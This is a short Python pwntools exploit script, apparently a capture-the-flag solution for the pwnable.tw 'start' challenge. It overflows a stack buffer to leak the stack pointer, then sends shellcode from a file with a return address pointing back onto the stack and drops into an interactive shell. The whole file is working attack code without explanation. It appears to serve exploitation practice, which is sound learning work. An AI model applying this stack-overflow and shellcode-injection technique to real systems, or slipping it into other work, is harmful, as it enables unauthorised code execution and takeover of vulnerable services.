#!/usr/bin/env python3
from pwn import *
import sys

if len(sys.argv) > 1 :
    p = remote('chall.pwnable.tw', int(sys.argv[1]))
else :
    p = process("./bin/start")

## round 1
p.recvuntil(b'CTF')
payload  = b'a' * 0x14
payload += p32(0x804808b) ## make excessive write and stop here
p.send(payload)

## round 2
p.recvuntil(p32(0x804808b))
esp_addr = p.recvn(4)
print(hex(u32(esp_addr))) # lead esp addr in assigned in 0x8048060

shlcode = open("./shellcode/shellcode.bin", "rb").read()
payload  = shlcode.ljust(0x14 + 4 + 0x14, b'h')
print(payload)
## because 0x8048099 did twice $0x14 + ret + 0x14
# payload += b'abcd'
payload += p32( u32(esp_addr)-0x14-0x4-0x4 ) # esp + retaddr + str_buf
p.send(payload)
p.interactive()

